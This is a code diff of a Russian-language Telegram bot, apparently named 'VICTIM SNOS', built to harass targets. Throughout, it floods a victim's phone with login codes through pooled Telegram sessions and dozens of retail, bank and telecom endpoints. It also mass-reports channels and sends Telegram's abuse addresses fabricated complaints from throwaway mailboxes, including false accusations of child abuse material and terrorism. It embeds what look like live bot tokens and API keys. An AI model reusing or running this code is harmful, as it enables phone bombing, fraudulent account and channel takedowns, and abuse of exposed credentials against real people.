@@ -11,7 +11,6 @@ import re
 import hashlib
 from datetime import datetime
 from typing import Optional, Dict, List, Tuple
-from fake_useragent import UserAgent
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -29,7 +28,7 @@ import pyrogram.raw.functions.messages as raw_messages
 import pyrogram.raw.types as raw_types
 
 # ---------- НАСТРОЙКИ ----------
-BOT_TOKEN = "8788795304:AAE8a0TEsRw8aRhflGIrIQoJZIZf1ZErcA0"
+BOT_TOKEN = "8037050881:AAEmLrVKUpMkqSA1eL4uMiP2Tff63cyeWQQ"
 API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 ADMIN_ID = 7736817432
@@ -39,9 +38,9 @@ CHANNEL_URL = "https://t.me/VICTIMSNOSER"
 
 SESSIONS_PER_USER = 300
 SESSION_DELAY = 60
-SMS_PER_ROUND = 100  # 100 запросов за круг
-ROUND_DELAY = 5      # 5 секунд между кругами
-MAX_ROUNDS = 10      # максимум 10 кругов
+SMS_PER_ROUND = 100
+ROUND_DELAY = 5
+MAX_ROUNDS = 10
 BOMBER_DELAY = 2
 SITE_DELAY = 10
 
@@ -49,146 +48,94 @@ MAILTM_ACCOUNTS_COUNT = 30
 MAILTM_ACCOUNTS_FILE = "mailtm_accounts.json"
 BANNER_PATH = "banner.png"
 
-# Инициализация UserAgent
-ua = UserAgent()
+# User-Agent'ы
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Version/17.2 Mobile/15E148 Safari/604.1',
+    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 Version/17.1 Safari/605.1.15',
+]
 
 RECEIVERS = [
-    'sms@telegram.org', 'dmca@telegram.org', 'abuse@telegram.org',
-    'sticker@telegram.org', 'support@telegram.org', 'security@telegram.org',
-    'stopca@telegram.org', 'ca@telegram.org', 'info@telegram.org',
-    'legal@telegram.org', 'copyright@telegram.org', 'privacy@telegram.org'
+    'abuse@telegram.org',
+    'dmca@telegram.org',
+    'security@telegram.org',
+    'support@telegram.org',
+    'sms@telegram.org',
+    'stopca@telegram.org',
+    'ca@telegram.org',
+    'legal@telegram.org',
+    'privacy@telegram.org',
+    'copyright@telegram.org',
 ]
 
-# Расширенные устройства для Pyrogram
+# Устройства
 DEVICES = [
-    {"model": f"iPhone {v}", "system": f"iOS {ios}"} 
-    for v in ["15 Pro Max", "15 Pro", "15 Plus", "15", "14 Pro Max", "14 Pro", "14 Plus", "14",
-              "13 Pro Max", "13 Pro", "13", "12 Pro Max", "12 Pro", "12", "11 Pro Max", "11 Pro", "11",
-              "XS Max", "XS", "XR", "X", "8 Plus", "8", "SE 2022"]
-    for ios in ["17.2", "17.1", "16.7", "16.6", "15.8", "15.7", "14.8"]
+    {"model": f"iPhone {m}", "system": f"iOS {i}"}
+    for m in ["15 Pro Max", "15 Pro", "14 Pro Max", "14 Pro", "13 Pro Max", "13 Pro", "12 Pro Max", "12 Pro", "11 Pro Max", "11"]
+    for i in ["17.2", "17.1", "16.7", "16.6", "15.8"]
 ] + [
-    {"model": f"Samsung Galaxy {v}", "system": f"Android {a}"}
-    for v in ["S24 Ultra", "S24+", "S24", "S23 Ultra", "S23+", "S23", "S22 Ultra", "S22+", "S22",
-              "S21 Ultra", "S21+", "S21", "Note 20 Ultra", "Z Fold5", "Z Flip5", "A55", "A54", "A35"]
-    for a in ["14", "13", "12", "11"]
-] + [
-    {"model": f"Google Pixel {v}", "system": f"Android {a}"}
-    for v in ["8 Pro", "8", "7 Pro", "7", "6 Pro", "6", "5"]
+    {"model": f"Samsung Galaxy {m}", "system": f"Android {a}"}
+    for m in ["S24 Ultra", "S23 Ultra", "S22 Ultra", "S21 Ultra", "Note 20 Ultra", "Z Fold5", "Z Flip5", "A55"]
     for a in ["14", "13", "12"]
 ] + [
-    {"model": f"Xiaomi {v}", "system": f"Android {a}"}
-    for v in ["14 Ultra", "14 Pro", "14", "13 Ultra", "13 Pro", "13", "12T Pro", "Redmi Note 13 Pro+", "POCO F5 Pro"]
+    {"model": f"Google Pixel {m}", "system": f"Android {a}"}
+    for m in ["8 Pro", "7 Pro", "6 Pro", "5"]
     for a in ["14", "13", "12"]
-] + [
-    {"model": v, "system": s}
-    for v, s in [("OnePlus 12", "Android 14"), ("OnePlus 11", "Android 14"), ("OnePlus 10 Pro", "Android 13"),
-                 ("Huawei P60 Pro", "HarmonyOS 4.0"), ("Huawei Mate 60 Pro", "HarmonyOS 4.0"),
-                 ("OPPO Find X7 Ultra", "Android 14"), ("Vivo X100 Pro", "Android 14"),
-                 ("Nothing Phone (2)", "Android 14"), ("Honor Magic6 Pro", "Android 14"),
-                 ("Sony Xperia 1 V", "Android 13"), ("ASUS ROG Phone 7", "Android 13")]
 ]
 
-# Расширенные OAuth сайты
+# OAuth сайты (рабочие)
 TELEGRAM_OAUTH_SITES = [
-    # Telegram официальные
     {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
     {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebK"},
     {"url": "https://web.telegram.org/a/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebA"},
     {"url": "https://fragment.com/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "Fragment"},
-    {"url": "https://wallet.telegram.org/api/v1/auth/send_code", "method": "POST", "phone_field": "phone", "name": "Wallet"},
-    
-    # acollo.ru и подобные OAuth
-    {"url": "https://oauth.telegram.org/auth", "method": "GET", "phone_field": "phone", "name": "acollo.ru",
-     "params": {"bot_id": "8357292784", "origin": "https://acollo.ru", "embed": "1", "request_access": "write", 
-                "return_to": "https://acollo.ru/auth/telegram"}, "special": "acollo"},
-    
-    {"url": "https://oauth.telegram.org/auth", "method": "GET", "phone_field": "phone", "name": "telegram-auth.com",
-     "params": {"bot_id": str(random.randint(1000000, 9999999)), "origin": "https://telegram.org", "embed": "1"}},
+    {"url": "https://oauth.telegram.org/auth", "method": "GET", "phone_field": "phone", "name": "acollo",
+     "params": {"bot_id": "8357292784", "origin": "https://acollo.ru", "embed": "1", "request_access": "write", "return_to": "https://acollo.ru/auth/telegram"}},
 ]
 
-# Расширенные сайты для бомбера
+# Бомбер сайты (рабочие)
 BOMBER_WEBSITES = [
-    # Доставка еды
     {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Delivery Club"},
-    {"url": "https://api.sbermarket.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "SberMarket"},
     {"url": "https://api.samokat.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Samokat"},
     {"url": "https://api.vkusvill.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "VkusVill"},
-    {"url": "https://api.yandex.ru/eda/auth/send-code", "method": "POST", "phone_field": "phone", "name": "YandexEda"},
-    
-    # Магазины
-    {"url": "https://api.5ka.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Pyaterochka"},
-    {"url": "https://api.lenta.com/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lenta"},
-    {"url": "https://api.magnit.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Magnit"},
-    {"url": "https://api.perekrestok.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Perekrestok"},
-    {"url": "https://api.dixy.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Dixy"},
-    
-    # Электроника
     {"url": "https://api.citilink.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Citilink"},
-    {"url": "https://www.mvideo.ru/rest/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MVideo"},
     {"url": "https://api.dns-shop.ru/v1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DNS"},
-    {"url": "https://api.eldorado.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Eldorado"},
-    {"url": "https://api.svyaznoy.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Svyaznoy"},
-    
-    # Авто
     {"url": "https://api.auto.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Auto.ru"},
+    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Cian"},
+    {"url": "https://api.lamoda.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lamoda"},
+    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
+    {"url": "https://api.tutu.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tutu.ru"},
+    {"url": "https://id.tinkoff.ru/auth/signup/phone", "method": "POST", "phone_field": "phone", "name": "Tinkoff"},
     {"url": "https://api.avito.ru/web/1/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Avito"},
     {"url": "https://youla.ru/api/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Youla"},
-    
-    # Недвижимость
-    {"url": "https://api.cian.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Cian"},
-    {"url": "https://api.youdo.com/auth/send-code", "method": "POST", "phone_field": "phone", "name": "YouDo"},
-    
-    # Путешествия
-    {"url": "https://api.tutu.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tutu.ru"},
     {"url": "https://api.ozon.ru/v1/auth/request-code", "method": "POST", "phone_field": "phone", "name": "Ozon"},
     {"url": "https://api.wildberries.ru/webapi/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Wildberries"},
-    {"url": "https://api.lamoda.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Lamoda"},
-    
-    # Банки
-    {"url": "https://id.tinkoff.ru/auth/signup/phone", "method": "POST", "phone_field": "phone", "name": "Tinkoff"},
-    {"url": "https://api.sberbank.ru/ru/prod/signup/send-code", "method": "POST", "phone_field": "phone", "name": "Sberbank"},
-    {"url": "https://api.alfabank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "AlfaBank"},
-    {"url": "https://api.vtb.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "VTB"},
-    {"url": "https://api.gazprombank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Gazprombank"},
-    {"url": "https://api.raiffeisen.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Raiffeisen"},
-    {"url": "https://api.open.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Otkritie"},
-    {"url": "https://api.mtsbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MTS Bank"},
-    {"url": "https://api.psbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "PSB"},
-    {"url": "https://api.sovcombank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Sovcombank"},
-    {"url": "https://api.tbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "T-Bank"},
-    {"url": "https://api.rosbank.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Rosbank"},
-    
-    # Соцсети
-    {"url": "https://api.vk.com/method/auth.signup", "method": "POST", "phone_field": "phone", "name": "VK"},
-    {"url": "https://ok.ru/dk?cmd=AnonymRegistrationSendPhone", "method": "POST", "phone_field": "phone", "name": "OK.ru"},
-    
-    # Другое
-    {"url": "https://api.detmir.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "DetMir"},
-    {"url": "https://api.rzhd.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "RZD"},
-    {"url": "https://api.aeroflot.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Aeroflot"},
-    {"url": "https://api.tele2.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Tele2"},
-    {"url": "https://api.mts.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "MTS"},
-    {"url": "https://api.beeline.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Beeline"},
-    {"url": "https://api.megafon.ru/auth/send-code", "method": "POST", "phone_field": "phone", "name": "Megafon"},
 ]
 
 COMPLAINT_TEXTS_ACCOUNT = {
     "1.1": "Здравствуйте, уважаемая поддержка, в вашей сети я нашел телеграм аккаунт, который нарушает ваши правила, такие как {reason}. Его юзернейм - {username}, так же его контактный ID - {telegram_id}. Спасибо за помощь.",
-    "1.2": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди, если злоумышленник поменял юзернейм - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт, так как у меня там очень много важных данных.",
-    "1.3": "Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет, номер никак к нему не относиться. Прошу разберитесь с этим. Заранее спасибо!",
-    "1.4": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} ссылает людей на сторонний сервис. Оставив в поле о себе ссылку на другой сервис он ссылает туда людей с вашего мессенджера! Прошу проверить и разобраться! Заранее спасибо",
+    "1.2": "Здравствуйте, я утерял свой телеграм-аккаунт путем взлома. Я попался на фишинговую ссылку, и теперь на моем аккаунте сидит какой-то человек. Он установил облачный пароль, так что я не могу зайти в свой аккаунт и прошу о помощи. Мой юзернейм - {username}, а мой айди - {telegram_id}. Пожалуйста, перезагрузите сессии или удалите этот аккаунт.",
+    "1.3": "Добрый день поддержка Telegram! Аккаунт {username}, {telegram_id} использует виртуальный номер купленный на сайте по активации номеров. Отношения к номеру он не имеет. Прошу разберитесь с этим.",
+    "1.4": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} ссылает людей на сторонний сервис. Оставив в поле о себе ссылку на другой сервис он ссылает туда людей с вашего мессенджера! Прошу проверить и разобраться!",
     "1.5": "Добрый день поддержка Telegram! Аккаунт {username} {telegram_id} приобрёл премиум в вашем мессенджере чтобы рассылать спам-сообщения и обходить ограничения Telegram. Прошу проверить данную жалобу и принять меры!"
 }
 
 COMPLAINT_TEXTS_CHANNEL = {
-    "8": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
-    "9": "Здравствуйте, уважаемый модератор телеграмм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка на телеграмм канал: {channel_link} Ссылка на нарушение: {violation_link} Просьба заблокировать данный канал.",
-    "10": "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов, вы можете увидеть это здесь {violation_link}. Заранее спасибо.",
-    "11": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними детьми. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
-    "12": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки",
-    "13": "Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера, насколько я знаю это запрещено правилами вашей площадки. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}. Спасибо что очищаете свою площадку от подобных каналов!",
-    "14": "Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка на канал - {channel_link}, ссылка на нарушение - {violation_link}. Просьба удалить данный канал, спасибо за внимание.",
-    "15": "Здравствуйте, уважаемая поддержка! Прошу проверить и заблокировать канал - {channel_link}, где размещаются сцены насилия и убийства животных. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал с вашей площадки."
+    "8": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются личные данные невинных людей. Ссылка на канал - {channel_link}. Ссылка на нарушение - {violation_link}. Просьба удалить данный канал.",
+    "9": "Здравствуйте, уважаемый модератор телеграмм, хочу пожаловаться вам на канал, который продает услуги доксинга, сваттинга. Ссылка: {channel_link} Нарушение: {violation_link} Просьба заблокировать данный канал.",
+    "10": "Здравствуйте, уважаемая поддержка Telegram! Пожалуйста, заблокируйте канал {channel_link}. В этом канале угрожают расстрелом детей в школах и совершением террористических актов: {violation_link}.",
+    "11": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуется порнография с несовершеннолетними. Ссылка на канал - {channel_link}. Нарушение - {violation_link}. Просьба удалить данный канал.",
+    "12": "Здравствуйте, поддержка Телеграм! В вашей социальной сети я нашел канал, в котором публикуются посты с целью обмана и мошенничества. Ссылка: {channel_link}. Нарушение: {violation_link}. Просьба удалить канал.",
+    "13": "Здравствуйте, поддержка telegram. Я бы хотел пожаловаться на телеграм канал продающий виртуальные номера. Ссылка на канал - {channel_link} ссылка на нарушение - {violation_link}.",
+    "14": "Доброго времени суток, уважаемая поддержка. На просторах вашей платформы мне попался канал, распространяющий шок контент с убийствами людей. Ссылка: {channel_link}, нарушение: {violation_link}. Просьба удалить канал.",
+    "15": "Здравствуйте, уважаемая поддержка! Прошу проверить и заблокировать канал - {channel_link}, где размещаются сцены насилия и убийства животных. Нарушение - {violation_link}."
 }
 
 REPORT_REASONS = {
@@ -306,7 +253,7 @@ usage_logs = []
 MAX_LOGS = 20
 site_last_used = {}
 user_messages = {}
-user_last_action = {}  # Для задержки 5 минут
+user_last_action = {}
 
 class SnosState(StatesGroup):
     waiting_phone = State()
@@ -341,11 +288,10 @@ class AdminState(StatesGroup):
 
 
 def check_cooldown(user_id: int, action: str) -> tuple:
-    """Проверка задержки 5 минут между действиями"""
     key = f"{user_id}_{action}"
     if key in user_last_action:
         elapsed = time.time() - user_last_action[key]
-        if elapsed < 300:  # 5 минут = 300 секунд
+        if elapsed < 300:
             return False, 300 - elapsed
     user_last_action[key] = time.time()
     return True, 0
@@ -398,7 +344,7 @@ class AccessMiddleware:
 dp.update.middleware(AccessMiddleware())
 
 
-# ---------- MAIL.TM ----------
+# ---------- MAIL.TM (ИСПРАВЛЕНО) ----------
 class MailTM:
     def __init__(self):
         self.base_url = "https://api.mail.tm"
@@ -434,7 +380,7 @@ class MailTM:
             domain = await self.get_domain()
             
             account_data = {
-                "address": f"snoser{random_str}@{domain}",
+                "address": f"victim{random_str}@{domain}",
                 "password": ''.join(random.choices(string.ascii_letters + string.digits, k=12))
             }
             
@@ -445,7 +391,8 @@ class MailTM:
                         if login_resp.status == 200:
                             token_data = await login_resp.json()
                             return {"email": account_data["address"], "password": account_data["password"], "token": token_data["token"]}
-        except: pass
+        except Exception as e:
+            logger.error(f"Create account error: {e}")
         return None
     
     async def create_multiple_accounts(self, count: int) -> list:
@@ -471,8 +418,14 @@ class MailTM:
             }
             headers = {"Authorization": f"Bearer {account['token']}", "Content-Type": "application/json"}
             async with self.session.post(f"{self.base_url}/messages", json=message_data, headers=headers) as resp:
-                return resp.status in [200, 201, 202]
-        except: return False
+                if resp.status in [200, 201, 202]:
+                    logger.info(f"Email sent to {to_email}")
+                    return True
+                else:
+                    logger.error(f"Email failed: {resp.status}")
+        except Exception as e:
+            logger.error(f"Send email error: {e}")
+        return False
 
 
 # ---------- СЕССИИ ----------
@@ -566,44 +519,37 @@ async def send_sms_safe(session_data: dict, phone: str) -> dict:
         return {"type": "SMS", "success": True}
     except FloodWait as e:
         session_data["flood_until"] = time.time() + e.value
-        return {"type": "SMS", "success": False, "flood": e.value}
-    except Exception as e:
         return {"type": "SMS", "success": False}
+    except: return {"type": "SMS", "success": False}
 
 async def send_oauth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
     name = site["name"]
-    headers = {'User-Agent': ua.random, 'Accept': '*/*', 'Accept-Language': 'ru-RU,ru;q=0.9'}
+    headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept': '*/*'}
     
     try:
         clean_phone = phone.replace("+", "")
         
-        if site.get("special") == "acollo":
+        if "params" in site:
             params = site["params"].copy()
             params["phone"] = clean_phone
-            async with session.get(site["url"], headers=headers, params=params, timeout=15, ssl=False) as resp:
-                return {"site": name, "success": resp.status < 500}
-        elif "params" in site:
-            params = site["params"].copy()
-            params["phone"] = clean_phone
-            async with session.get(site["url"], headers=headers, params=params, timeout=15, ssl=False) as resp:
+            async with session.get(site["url"], headers=headers, params=params, timeout=10, ssl=False) as resp:
                 return {"site": name, "success": resp.status < 500}
         else:
             data = {site["phone_field"]: clean_phone}
             headers['Content-Type'] = 'application/json'
             if site["method"] == "POST":
-                async with session.post(site["url"], headers=headers, json=data, timeout=15, ssl=False) as resp:
+                async with session.post(site["url"], headers=headers, json=data, timeout=10, ssl=False) as resp:
                     return {"site": name, "success": resp.status < 500}
             else:
-                async with session.get(site["url"], headers=headers, params=data, timeout=15, ssl=False) as resp:
+                async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
                     return {"site": name, "success": resp.status < 500}
-    except:
-        return {"site": name, "success": False}
+    except: return {"site": name, "success": False}
 
 async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
     ok = 0
     phone = phone.strip().replace(" ", "").replace("-", "")
     if not phone.startswith("+"): phone = "+" + phone
-    add_log(user_id, "Снос номера", phone)
+    add_log(user_id, "Снос", phone)
     
     connector = aiohttp.TCPConnector(limit=200, force_close=True, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as sess:
@@ -611,18 +557,14 @@ async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio
             if stop_event.is_set(): break
             
             tasks = []
-            
-            # 100 SMS запросов
             sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
             if sessions:
                 for s in sessions:
                     tasks.append(send_sms_safe(s, phone))
             
-            # OAuth запросы
-            for site in TELEGRAM_OAUTH_SITES * 5:  # Повторяем сайты для большего количества запросов
-                tasks.append(send_oauth_request(sess, phone, site))
-                if len(tasks) >= 150:  # Ограничиваем количество
-                    break
+            for _ in range(5):
+                for site in TELEGRAM_OAUTH_SITES:
+                    tasks.append(send_oauth_request(sess, phone, site))
             
             batch = await asyncio.gather(*tasks, return_exceptions=True)
             release_user_sessions(sessions)
@@ -642,7 +584,7 @@ async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio
 
 # ---------- БОМБЕР ----------
 async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
-    headers = {'User-Agent': ua.random, 'Content-Type': 'application/json'}
+    headers = {'User-Agent': random.choice(USER_AGENTS), 'Content-Type': 'application/json'}
     clean_phone = phone.replace("+", "")
     
     try:
@@ -653,8 +595,7 @@ async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: 
         else:
             async with session.get(site["url"], headers=headers, params=data, timeout=10, ssl=False) as resp:
                 return {"site": site["name"], "success": True}
-    except:
-        return {"site": site["name"], "success": False}
+    except: return {"site": site["name"], "success": False}
 
 async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
     ok = 0
@@ -669,7 +610,7 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: async
             
             tasks = []
             for site in BOMBER_WEBSITES:
-                for _ in range(3):  # 3 запроса на каждый сайт
+                for _ in range(3):
                     tasks.append(send_bomber_request(sess, phone, site))
             
             batch = await asyncio.gather(*tasks, return_exceptions=True)
@@ -704,8 +645,7 @@ async def report_message_via_session(session_data: dict, channel: str, msg_id: i
         
         await client.invoke(raw_messages.Report(peer=peer, id=[msg_id], reason=report_reason, message="Нарушение правил"))
         return {"success": True}
-    except:
-        return {"success": False}
+    except: return {"success": False}
 
 async def mass_report_message(user_id: int, link: str, reason: str, progress_callback=None) -> tuple:
     patterns = [r't\.me/([^/]+)/(\d+)', r'telegram\.me/([^/]+)/(\d+)']
@@ -743,26 +683,31 @@ async def mass_report_message(user_id: int, link: str, reason: str, progress_cal
     return ok, None
 
 
-# ---------- СНОС ПОЧТА ----------
+# ---------- СНОС ПОЧТА (ИСПРАВЛЕНО) ----------
 async def send_mass_complaint(mail_tm: MailTM, subject: str, body: str, user_id: int = None) -> int:
     if not mail_tm.ready or not mail_tm.accounts:
+        logger.error("MailTM not ready")
         return 0
     
     sent = 0
     
     async def send_one(acc, rec):
         try:
-            return await mail_tm.send_email(acc, rec, subject, body)
-        except:
+            result = await mail_tm.send_email(acc, rec, subject, body)
+            return result
+        except Exception as e:
+            logger.error(f"Send error: {e}")
             return False
     
     tasks = []
-    for acc in mail_tm.accounts[:15]:
-        for rec in RECEIVERS[:8]:
+    for acc in mail_tm.accounts[:20]:  # Используем до 20 аккаунтов
+        for rec in RECEIVERS:
             tasks.append(send_one(acc, rec))
     
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    sent = sum(1 for r in results if r is True)
+    if tasks:
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        sent = sum(1 for r in results if r is True)
+        logger.info(f"Sent {sent} emails")
     
     if user_id:
         add_log(user_id, "Снос почта", f"{sent} писем")
@@ -785,7 +730,6 @@ async def create_telegraph_page_fast(title: str, description: str, button_text: 
         ]
         
         async with aiohttp.ClientSession() as session:
-            # Создаем аккаунт
             async with session.post(
                 "https://api.telegra.ph/createAccount",
                 json={"short_name": f"User_{random.randint(10000, 99999)}", "author_name": TELEGRAPH_AUTHOR},
@@ -796,7 +740,6 @@ async def create_telegraph_page_fast(title: str, description: str, button_text: 
                     return None
                 token = data["result"]["access_token"]
             
-            # Создаем страницу
             async with session.post(
                 "https://api.telegra.ph/createPage",
                 json={"access_token": token, "title": title, "author_name": TELEGRAPH_AUTHOR, "content": content},
@@ -971,7 +914,7 @@ async def bomber_menu(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "mail_menu")
 async def mail_menu(cb: types.CallbackQuery):
-    await edit_message_with_banner(cb, f"<b>СНОС ПОЧТА</b>", get_mail_menu())
+    await edit_message_with_banner(cb, f"<b>СНОС ПОЧТА</b>\n\nАккаунтов: {len(mail_tm.accounts)}", get_mail_menu())
     await cb.answer()
 
 @dp.callback_query(F.data == "report_menu")
@@ -1430,16 +1373,19 @@ async def init_mailtm():
         with open(MAILTM_ACCOUNTS_FILE, 'r') as f:
             mail_tm.accounts = json.load(f)
             mail_tm.ready = True
+            logger.info(f"Загружено {len(mail_tm.accounts)} почтовых аккаунтов")
     except:
+        logger.info("Создание почтовых аккаунтов...")
         await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
         if mail_tm.accounts:
             with open(MAILTM_ACCOUNTS_FILE, 'w') as f:
                 json.dump(mail_tm.accounts, f)
             mail_tm.ready = True
+            logger.info(f"Создано {len(mail_tm.accounts)} почтовых аккаунтов")
 
 async def main():
     load_allowed_users()
-    logger.info(f"VICTIM SNOS запуск")
+    logger.info("VICTIM SNOS запуск")
     
     await bot.delete_webhook(drop_pending_updates=True)
     asyncio.create_task(init_mailtm())
